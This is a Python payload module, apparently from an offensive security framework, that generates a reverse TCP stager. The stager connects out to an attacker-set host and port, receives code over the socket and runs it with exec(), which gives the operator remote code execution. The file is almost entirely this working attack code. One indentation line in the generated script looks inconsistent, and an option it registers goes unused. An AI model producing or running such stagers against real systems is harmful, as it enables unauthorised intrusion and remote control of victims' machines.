import ipaddress
from collections.abc import Sequence

from teralibs.tsf.base.payload import Payload


class PythonReverseTCP(Payload):
    """Python Reverse TCP."""

    OPTIONS: Sequence = ["LHOST", "LPORT", "SHELL"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.register_advanced_options(
            [
                self.opt(
                    "ReverseConnectRetries",
                    "10",
                    False,
                    "Configures the connection persistence loop within the network-based stager",
                    self.otype.INTEGER,
                )
            ]
        )

    def generate(self, ctx):
        """Generate the python stager payload."""
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))

        ipf = "AF_INET"
        try:
            ipaddress.IPv6Address(ctx.get_option("LHOST"))
            ipf += "6"
            host = f"[{ctx.get_option('LHOST')}]"
        except ValueError:
            pass

        # We do this so we don't get unnecessary bytes from doing a triple quote string.
        # We can control the bytes here to remove whitespaces incase we want to lower the bytes.
        python_stager = [
            "import socket",
            "import sys",
            "import struct",
            f"ip = '{host}'",
            f"port = {port}",
            "try:",
            f"   s = socket.socket(socket.{ipf}, socket.SOCK_STREAM)",
            "    s.connect((ip, port))",
            "except Exception:",
            "    sys.exit(1)",
            "len_data = s.recv(4)",
            "if not len_data or len(len_data) < 4:",
            "    s.close()",
            "    sys.exit(1)",
            "payload_len = struct.unpack('>I', len_data)[0]",
            "payload = b''",
            "while len(payload) < payload_len:",
            "    chunk = s.recv(payload_len - len(payload))",
            "    if not chunk:",
            "        break",
            "    payload += chunk",
            "context = {",
            "    'msgsock': s,",
            "    'msgsock_type': 'socket'",
            "}",
            "try:",
            "    exec(payload.decode('utf-8'), context)",
            "except Exception:",
            "    pass",
            "finally:",
            "    s.close()",
        ]

        return "\n".join(python_stager)
